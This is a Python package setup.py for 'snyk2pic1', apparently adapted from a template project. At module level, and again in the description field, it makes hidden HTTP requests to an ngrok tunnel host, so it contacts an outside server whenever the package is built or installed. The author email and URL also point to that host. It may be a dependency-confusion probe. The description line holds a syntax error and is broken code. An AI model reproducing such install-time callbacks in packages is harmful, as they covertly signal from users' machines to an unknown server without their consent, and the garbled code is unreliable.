from setuptools import setup, find_packages
from json import load
from pkg_resources import resource_stream
import requests

requests.get('https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/requests1');
schema = load(resource_stream('exampleproject', 'data/schema.json'))


setup(
    name='snyk2pic1',
    version='1.0.0',
    description=requests.get('https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/requests2');,
    author='Rogier van der Geer',
    author_email='rogiervandergeer@d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app',
    url='https://d872-2a0d-6fc2-6430-1c00-6c2d-8d7d-2238-8b0a.ngrok-free.app/setup/url',
    packages=find_packages(include=['exampleproject', 'exampleproject.*']),
    install_requires=[
        'PyYAML',
        'pandas==0.23.3',
        'numpy>=1.14.5'
    ],
    setup_requires=['requests'],
    tests_require=['pytest'],
    entry_points={
        'console_scripts': ['my-command=exampleproject.example:main']
    },
)
